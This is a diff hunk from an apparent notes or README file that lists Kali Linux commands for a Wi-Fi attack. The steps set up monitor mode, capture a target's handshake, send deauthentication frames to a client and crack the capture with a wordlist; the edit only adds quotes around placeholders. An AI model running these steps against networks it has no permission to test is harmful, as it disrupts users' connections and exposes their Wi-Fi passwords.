@@ -29,7 +29,7 @@ Kali Linux Commands:<br>
 3. airmon-ng stop wlan0 (if the interface is wlan0)<br>
 4. airmon-ng start wlan0 ( from stopping to start I will be gone into monitoring mode)<br>
 5. airodump-ng wlan0 or wlan0mon<br>
-6. airodump-ng --bssid <BSSID> --channel <CHANNEL> -w <ESSID> wlan0 (or if its wlan0mon)<br>
+6. airodump-ng --bssid "<BSSID>" --channel "<CHANNEL>" -w "<ESSID>" wlan0 (or if its wlan0mon)<br>
 7. Open another terminal or terminal tab and then enter the following command<br>
 8. aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0<br>
 9. aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap<br>
